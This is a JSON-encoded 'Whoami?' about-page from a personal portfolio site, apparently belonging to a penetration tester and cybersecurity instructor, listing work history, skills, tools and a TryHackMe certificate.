Cybersecurity Instructor at HIVE Consult (Remote- Feb, 2025 to present) (i) Delivering engaging and effective penetration testing and Introduction to Linux courses to students, imparting practical skills and theoretical knowledge.\n(ii) Developing curriculum content, practical labs, and assessments to ensure a well-rounded and impactful learning experience.\n(iii) Providing mentorship and guidance to students, preparing them for real-world challenges in the field of cybersecurity.\nIntern Penetation Tester at Hack Secure (Remote- April,2025 to May,2025) (i) Conducted penetration tests on web applications, networks, and systems to identify vulnerabilities and assess the overall security posture.\n(ii) Provided detailed and actionable reports to clients, outlining vulnerabilities,potential exploits, and recommended mitigation strategies\nüìù Write-ups Check out my latest security write-ups here.\n","permalink":"http://localhost:1313/about/","summary":"\u003ch3 id=\"introduction\"\u003e‚ùìIntroduction\u003c/h3\u003e\n\u003cp\u003eHii, I\u0026rsquo;m \u003cem\u003e\u003cstrong\u003eAppiah Bismark\u003c/strong\u003e\u003c/em\u003e ‚ÄúAlso known online as  \u003cem\u003e\u003cstrong\u003eKwesi\nLarry(0kxwizard)\u003c/strong\u003e\u003c/em\u003e,an Application Security Tester and Bug Hunter with\nexperience in scripting, networking and linux administration. I Love\nbreaking things (ethically), and sharing my knowledge, I love learning and   mostly use my leisure time to do\n\u003cem\u003e\u003cstrong\u003eOSINT and Forensics Investigations\u003c/strong\u003e\u003c/em\u003e and sometimes play chess.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"-skills\"\u003eüí° Skills\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePenetration Testing:\u003c/strong\u003e OWASP Top 10, Web Application\nTesting,Wireless Network Testing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProgramming:\u003c/strong\u003e Python, Bash scripting.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInvestigations:\u003c/strong\u003e OSINT Investigations, Forensics Investigations.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSecurity Auditing:\u003c/strong\u003e Vulnerability Assessment and Penetration\nTesting, Report writing, Code Reviews,Bug Hunting.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMiscellaneous:\u003c/strong\u003e Docker, Git, Markdown.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTools:\u003c/strong\u003e Metasploit, Burpsuite, OWASP Zap, NMAP,Wireshark,Nessuss.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3 id=\"-achievements-and-certifications\"\u003eüèÖ Achievements and Certifications\u003c/h3\u003e\n\u003cp\u003e-TryHackMe Junior Penetration Tester \u003ca href=\"https://tryhackme-certificates.s3-eu-west-1.amazonaws.com/THM-A2UKXSWHOZ.pdf\"\u003ecertificate\nhere\u003c/a\u003e\u003c/p\u003e","title":"Whoami?"}]